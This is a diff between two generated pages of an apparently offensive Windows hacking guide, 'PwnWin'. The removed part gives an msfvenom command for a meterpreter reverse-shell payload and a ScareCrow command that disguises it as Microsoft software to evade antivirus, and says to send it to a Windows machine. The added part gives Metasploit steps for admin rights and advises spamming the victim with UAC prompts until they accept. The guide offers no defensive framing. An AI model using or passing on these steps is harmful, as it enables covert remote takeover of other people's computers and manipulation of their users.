@@ -5,15 +5,15 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
       <link rel="shortcut icon" href="../img/favicon.ico" />
-    <title>03   Create an executable - PwnWin</title>
+    <title>04   Get admin rights - PwnWin</title>
     <link rel="stylesheet" href="../css/theme.css" />
     <link rel="stylesheet" href="../css/theme_extra.css" />
         <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github.min.css" />
     
       <script>
         // Current page data
-        var mkdocs_page_name = "03   Create an executable";
-        var mkdocs_page_input_path = "03 - Create an executable.md";
+        var mkdocs_page_name = "04   Get admin rights";
+        var mkdocs_page_input_path = "04 - Get admin rights.md";
         var mkdocs_page_url = null;
       </script>
     
@@ -51,12 +51,12 @@
                 <li class="toctree-l1"><a class="reference internal" href="../02%20-%20Start%20the%20listener/">02   Start the listener</a>
                 </li>
               </ul>
-              <ul class="current">
-                <li class="toctree-l1 current"><a class="reference internal current" href="./">03   Create an executable</a>
+              <ul>
+                <li class="toctree-l1"><a class="reference internal" href="../03%20-%20Create%20an%20executable/">03   Create an executable</a>
                 </li>
               </ul>
-              <ul>
-                <li class="toctree-l1"><a class="reference internal" href="../04%20-%20Get%20admin%20rights/">04   Get admin rights</a>
+              <ul class="current">
+                <li class="toctree-l1 current"><a class="reference internal current" href="./">04   Get admin rights</a>
                 </li>
               </ul>
               <p class="caption"><span class="caption-text">Installs</span></p>
@@ -80,7 +80,7 @@
         <div class="rst-content"><div role="navigation" aria-label="breadcrumbs navigation">
   <ul class="wy-breadcrumbs">
     <li><a href=".." class="icon icon-home" aria-label="Docs"></a></li>
-      <li class="breadcrumb-item active">03   Create an executable</li>
+      <li class="breadcrumb-item active">04   Get admin rights</li>
     <li class="wy-breadcrumbs-aside">
     </li>
   </ul>
@@ -89,20 +89,20 @@
           <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
             <div class="section" itemprop="articleBody">
               
-                <pre><code class="language-sh"># Spawn a Metasploit executable
-msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=YOUR_IP LPORT=LISTENER_PORT -f raw -o av-bypass.bin
-
-# Make the executable undetectable
-./ScareCrow -I av-bypass.bin -domain www.microsoft.com -encryptionmode AES
-# This spawns a random exe, like powerpoint, onedrive, etc. I've tried with excel and it worked first try.
+                <p>I've tried multiple exploit that do this, but this way was the only one I've managed to get working while keeping the antivirus on.</p>
+<pre><code class="language-sh">meterpreter &gt; background
+msf6 exploit(multi/handler) &gt; use exploit/windows/local/ask
+msf6 exploit(windows/local/ask) &gt; set session 1
+msf6 exploit(windows/local/ask) &gt; set technique PSH
+msf6 exploit(windows/local/ask) &gt; exploit
 </code></pre>
-<p>Now send the generated executable to a Windows machine, and that's all!</p>
+<p>After running this, the user will be prompted with a UAC prompt. Even if they click no, you can still spam them, until they click yes. After that, metasploit will open a new session with admin rights.</p>
               
             </div>
           </div><footer>
     <div class="rst-footer-buttons" role="navigation" aria-label="Footer Navigation">
-        <a href="../02%20-%20Start%20the%20listener/" class="btn btn-neutral float-left" title="02   Start the listener"><span class="icon icon-circle-arrow-left"></span> Previous</a>
-        <a href="../04%20-%20Get%20admin%20rights/" class="btn btn-neutral float-right" title="04   Get admin rights">Next <span class="icon icon-circle-arrow-right"></span></a>
+        <a href="../03%20-%20Create%20an%20executable/" class="btn btn-neutral float-left" title="03   Create an executable"><span class="icon icon-circle-arrow-left"></span> Previous</a>
+        <a href="../Installs/Install%20Metasploit/" class="btn btn-neutral float-right" title="Install Metasploit">Next <span class="icon icon-circle-arrow-right"></span></a>
     </div>
 
   <hr/>
@@ -125,10 +125,10 @@ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=YOUR_IP LPORT=LISTENER_POR
   <span class="rst-current-version" data-toggle="rst-current-version">
     
     
-      <span><a href="../02%20-%20Start%20the%20listener/" style="color: #fcfcfc">&laquo; Previous</a></span>
+      <span><a href="../03%20-%20Create%20an%20executable/" style="color: #fcfcfc">&laquo; Previous</a></span>
     
     
-      <span><a href="../04%20-%20Get%20admin%20rights/" style="color: #fcfcfc">Next &raquo;</a></span>
+      <span><a href="../Installs/Install%20Metasploit/" style="color: #fcfcfc">Next &raquo;</a></span>
     
   </span>
 </div>
